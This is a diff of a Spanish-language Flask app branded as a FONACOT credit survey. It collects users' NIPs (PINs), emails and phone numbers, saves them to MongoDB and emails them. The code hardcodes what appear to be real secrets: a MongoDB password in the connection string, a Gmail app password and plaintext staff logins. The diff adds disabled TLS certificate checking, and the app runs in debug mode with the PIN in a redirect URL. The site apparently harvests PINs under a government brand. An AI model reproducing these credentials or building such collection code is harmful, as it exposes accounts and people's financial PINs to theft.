@@ -7,53 +7,50 @@ from email.mime.multipart import MIMEMultipart
 import os
 
 app = Flask(__name__)
-app.secret_key = os.getenv("FLASK_SECRET_KEY", "tu_clave_secreta_aqui")  # Cambia por algo seguro
+app.secret_key = os.getenv("FLASK_SECRET_KEY", "tu_clave_secreta_aqui")
 
-# ---------------- CONEXIÓN A MONGO ATLAS ----------------
 MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://fonacottoluca385:GUZCSZWL-VEr4yw@cluster0.mx9qqtg.mongodb.net/encuesta_credito?retryWrites=true&w=majority&appName=Cluster0")
 MONGO_DB = os.getenv("MONGO_DB", "encuesta_credito")
 
 try:
-    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)  # 5s timeout
+    client = MongoClient(
+        MONGO_URI,
+        tls=True,
+        tlsAllowInvalidCertificates=True,
+        serverSelectionTimeoutMS=5000
+    )
     db = client[MONGO_DB]
     respuestas = db["respuestas"]
-    client.server_info()  # Verifica la conexión
-    print("✅ Conexión a MongoDB Atlas exitosa")
+    client.server_info()
 except Exception as e:
-    print(f"❌ Error conectando a MongoDB Atlas: {e}")
-    respuestas = None  # Para evitar que la app falle
+    print(f"Error conectando a MongoDB Atlas: {e}")
+    respuestas = None
 
-# ---------------- USUARIOS ----------------
 USUARIOS = {
     "RAUL GARRIDO": "TOLUCA2065",
     "ANGELICA CORONEL": "INFONA2025",
     "HECTOR PAZ": "FONACOT2025"
 }
 
-# ------------------- CONFIGURACIÓN DE CORREO -------------------
 EMAIL_SENDER = os.getenv("EMAIL_SENDER", "fonacottoluca385@gmail.com")
-EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "jmhcmnihkibwxcyx")  # Contraseña de aplicación Gmail
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "jmhcmnihkibwxcyx")
 
 def enviar_correo(nip, correo_receptor, numero):
     try:
         asunto = "REGISTRO EXITOSO FONACOT"
         cuerpo = f"Se ha registrado un nuevo usuario:\n\nNIP: {nip}\nCorreo: {correo_receptor}\nNúmero: {numero}"
-
         mensaje = MIMEMultipart()
         mensaje["From"] = EMAIL_SENDER
         mensaje["To"] = correo_receptor
         mensaje["Subject"] = asunto
         mensaje.attach(MIMEText(cuerpo, "plain"))
-
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(EMAIL_SENDER, EMAIL_PASSWORD)
         server.sendmail(EMAIL_SENDER, correo_receptor, mensaje.as_string())
         server.quit()
-        print("✅ Correo enviado correctamente a", correo_receptor)
     except Exception as e:
-        print(f"❌ Error enviando el correo: {e}")
-# ----------------------------------------------------------------
+        print(f"Error enviando el correo: {e}")
 
 @app.route('/')
 def portada():
@@ -65,7 +62,6 @@ def encuesta():
         if respuestas is None:
             flash("Error: No se puede conectar a la base de datos. Intenta más tarde.")
             return render_template('encuesta.html')
-
         datos = request.form.to_dict()
         datos['fecha'] = datetime.now().strftime("%Y-%m-%d")
         try:
@@ -73,13 +69,10 @@ def encuesta():
         except Exception as e:
             flash(f"Error al guardar los datos: {e}")
             return render_template('encuesta.html')
-
         nip = datos.get('nip', '******')
         correo = datos.get('correo', 'No proporcionado')
         numero = datos.get('celular', 'No proporcionado')
-
         enviar_correo(nip, correo, numero)
-
         return redirect(f'/registro_exitoso?nip={nip}')
     return render_template('encuesta.html')
 
@@ -124,4 +117,3 @@ def datos_grafico():
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=True)
-
